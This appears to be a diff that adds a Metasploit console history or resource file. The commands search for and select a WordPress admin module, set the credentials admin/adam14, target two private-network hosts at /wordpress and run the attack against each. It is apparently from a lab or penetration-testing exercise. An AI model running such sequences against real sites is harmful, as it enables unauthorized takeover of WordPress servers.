@@ -1,0 +1,11 @@
+search wordpress admin
+use 2
+set PASSWORD adam14
+set RHOSTS 192.168.0.111
+set TARGETURI /wordpress
+set USERNAME admin
+run
+set RHOSTS 192.168.0.110
+RUN
+run
+quit
